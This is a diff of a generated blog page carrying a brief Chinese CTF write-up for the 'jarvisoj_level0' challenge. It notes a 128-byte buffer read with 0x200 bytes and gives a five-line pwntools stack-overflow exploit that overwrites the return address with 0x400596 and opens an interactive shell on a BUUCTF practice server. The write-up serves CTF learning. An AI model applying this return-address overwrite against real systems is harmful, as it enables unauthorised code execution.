@@ -172,7 +172,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      264 字
+      258 字
     </span>
   
 
@@ -250,8 +250,8 @@
 
 
 <h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p>ida</p>
-<p>![](level0 1.png)</p>
-<p>![](level0 2.png)</p>
+<p><img src="level1.png" srcset="/img/loading.gif"></p>
+<p><img src="level2.png" srcset="/img/loading.gif"></p>
 <p>buf长度128，读入0x200可溢出</p>
 <p>exp</p>
 <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">sh</span>=remote(&#x27;node<span class="hljs-number">3</span>.buuoj.cn&#x27;,<span class="hljs-number">26339</span>)<br><span class="hljs-attribute">payload</span>=&#x27;a&#x27;*<span class="hljs-number">136</span>+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">400596</span>)<br><span class="hljs-attribute">sh</span>.send(payload)<br><span class="hljs-attribute">sh</span>.interactive()<br></code></pre></div></td></tr></table></figure>
